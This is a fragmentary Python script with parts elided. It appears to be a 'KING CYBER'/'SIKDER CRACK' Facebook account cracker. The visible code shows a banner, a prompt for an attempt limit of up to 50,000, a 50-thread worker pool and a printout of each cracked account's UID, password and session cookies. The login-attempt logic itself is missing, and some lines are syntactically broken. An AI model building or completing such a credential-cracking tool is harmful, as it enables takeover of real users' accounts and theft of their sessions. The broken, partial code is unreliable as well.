...
logo = ("""
      ...
      \033[34;1m$$ |\$$\    $$ |  $$ |\$$$ |$$ |  $$ |
      \033[34;1m$$ | \$$\ $$$$$$\ $$ | \$$ |\$$$$$$  |
      \033[34;1m\__|  \__|\______|\__|  \__| \______/ 
\033[34;1m✮⃝ KING𝄟⃝\x1b[38;5;196m {𝟭}\033[38;5;46m\x1b[38;5;196m╔══➻〱𝗡𝗔𝗠𝗘\033[33;1m➽   \033[38;5;46mSIKDER
...
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════SIKDER""")
def linex():
	print('\033[38;5;49m════════════════════════════════')
loop = 0
oks = []
...
def xxr():
    ...
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[38;5;50m𝙇𝙄𝙈𝙄𝙏 :20000/30000/50000\033[38;5;49m𝙇𝙄𝙈𝙄𝙏: '))
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[38;5;50mKING CYBER40)
...
#__________𝗢𝗞✅-𝗜𝗗-------➲🥰🥰       
                print(f"""
\033[33;1mKING 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆╔══➻💎\033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍╔══➻💎\033[38;5;46m{uid} 
\033[33;1mSIKDER💚𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╚══➻💎\033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿╚══➻💎\033[38;5;46m{ps}
\033[33;1mKING 𝘾𝙊𝙊𝙆𝙀𝙎(𝗢𝗞✅)\033[38;5;46m{coki}
""")
                ...
                continue
        loop+=1
        brand=random.choice(['KING CYBER','KING CYBER ','SIKDER CRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}KING❤️‍🔥🎁CYBER🥰\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}KING CYBER{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
